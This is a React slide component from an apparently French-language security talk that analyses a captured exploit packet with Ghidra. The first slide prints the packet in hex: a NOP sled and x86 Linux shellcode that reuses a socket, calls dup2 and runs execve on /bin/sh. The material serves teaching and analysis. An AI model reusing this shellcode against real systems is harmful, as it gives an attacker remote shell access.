import React from "react";
import styles from "./Payload.css";
import {Slide} from "../../Slide/Slide";
import ghidra from "./ghidra.png";
import binsh0 from './bin_sh0.svg';
import binsh1 from './bin_sh1.svg';
import binsh2 from './bin_sh2.svg';
import binsh3 from './bin_sh3.svg';
import binsh4 from './bin_sh4.svg';
import binsh5 from './bin_sh5.svg';
import binsh6 from './bin_sh6.svg';
import binsh7 from './bin_sh7.svg';
import binsh8 from './bin_sh8.svg';

export const payloadTitles = {
  title: "Payload",
  subtitles: [
    {
      title: "Vue globale",
      length: 1,
    },
    {
      title: "Analyse Ghidra",
      length: 2,
    },
  ],
};

export const Payload = () => {
  return (
    <React.Fragment>
      <Slide data-background-color="#f6f8fa">
        <pre className={styles.payload}>
          0000   <span className={styles.payload_transmission}>08 00 27 d6 0f 5a 54 bf 64 79 25 77 08 00 45 00</span>   ..'Ö.ZT¿dy%w..E.<br/>
          0010   <span className={styles.payload_transmission}>01 0a 14 44 40 00 40 06 a0 91 c0 a8 01 64 c0 a8</span>   ...D@.@. .À¨.dÀ¨<br/>
          0020   <span className={styles.payload_transmission}>02 64 bf 1c 17 70 18 f8 6b dd 61 77 a2 e3 80 18</span>   .d¿..p.økÝaw¢ã..<br/>
          0030   <span className={styles.payload_transmission}>00 bb 0a 0a 00 00 01 01 08 0a 00 08 80 de 00 03</span>   .»...........Þ..<br/>
          0040   <span className={styles.payload_transmission}>d1 af</span><span className={styles.payload_payload}> <b>90 90 90 90 90 90 90 90 90 90 90 90 90 90</b></span>   Ñ¯..............<br/>
          0050   <span className={styles.payload_payload}><b>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</b></span>   ................<br/>
          0060   <span className={styles.payload_payload}><b>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</b></span>   ................<br/>
          0070   <span className={styles.payload_payload}><b>90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</b></span>   ................<br/>
          0080   <span className={styles.payload_payload}><b>90 90</b> eb 71 5d 31 c0 31 db 31 c9 31 d2 31 ff 31</span>   ..ëq]1À1Û1É1Ò1ÿ1<br/>
          0090   <span className={styles.payload_payload}>f6 b0 22 89 c6 b0 c0 b1 01 66 c1 e1 0c b2 03 4f</span>   ö°".Æ°À±.fÁá.².O<br/>
          00a0   <span className={styles.payload_payload}>cd 80 89 c1 31 ff b3 02 89 ca 80 c1 04 31 c0 66</span>   Í..Á1ÿ³..Ê.Á.1Àf<br/>
          00b0   <span className={styles.payload_payload}>b8 70 01 fe c3 c6 02 10 89 39 cd 80 39 f8 75 ed</span>   ¸p.þÃÆ...9Í.9øuí<br/>
          00c0   <span className={styles.payload_payload}>8b 01 3c 02 75 e7 89 ca 31 c9 31 c0 b0 3f cd 80</span>   ..&lt;.uç.Ê1É1À°?Í.<br/>
          00d0   <span className={styles.payload_payload}>41 b0 3f cd 80 41 b0 3f cd 80 31 c0 89 6d 08 89</span>   A°?Í.A°?Í.1À.m..<br/>
          00e0   <span className={styles.payload_payload}>45 0c 88 45 07 b0 0b 89 eb 8d 4d 08 8d 55 0c cd</span>   E..E.°..ë.M..U.Í<br/>
          00f0   <span className={styles.payload_payload}>80 b0 01 cd 80 e8 8a ff ff ff</span><span className={styles.payload_data}> 2f 62 69 6e 2f 73</span>   .°.Í.è.ÿÿÿ<b>/bin/s</b><br/>
          0100   <span className={styles.payload_data}>68 41 41 41 41 41 41 41 41 41</span><span className={styles.payload_unknown}> 0a 00 00 00 0d 00</span>   <b>h</b>AAAAAAAAA......<br/>
          0110   <span className={styles.payload_unknown}>00 00 8b 91 98 c3 ff 0a                        </span>   ........&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br/>
        </pre>
        <div className={styles.legend}>
          <span><span className={styles.payload_transmission}>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>&nbsp;&nbsp;&nbsp; protocole</span>
          <span><span className={styles.payload_payload}>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>&nbsp;&nbsp;&nbsp; code</span>
          <span><span className={styles.payload_data}>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>&nbsp;&nbsp;&nbsp; data</span>
          <span><span className={styles.payload_unknown}>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>&nbsp;&nbsp;&nbsp; indéfini</span>
        </div>
      </Slide>
      <Slide data-background-color="#f6f8fa">
        <img className={styles.ghidra} alt="ghidra" src={ghidra}/>
      </Slide>
      <Slide>
        <img alt="binsh" className={`${styles.binsh}`} src={binsh0}/>
        <img alt="binsh" className={`fragment ${styles.binsh}`} src={binsh1}/>
        <img alt="binsh" className={`fragment ${styles.binsh}`} src={binsh2}/>
        <img alt="binsh" className={`fragment ${styles.binsh}`} src={binsh3}/>
        <img alt="binsh" className={`fragment ${styles.binsh}`} src={binsh4}/>
        <img alt="binsh" className={`fragment ${styles.binsh}`} src={binsh5}/>
        <img alt="binsh" className={`fragment ${styles.binsh}`} src={binsh6}/>
        <img alt="binsh" className={`fragment ${styles.binsh}`} src={binsh7}/>
        <img alt="binsh" className={`fragment ${styles.binsh}`} src={binsh8}/>
      </Slide>
    </React.Fragment>
  );
};
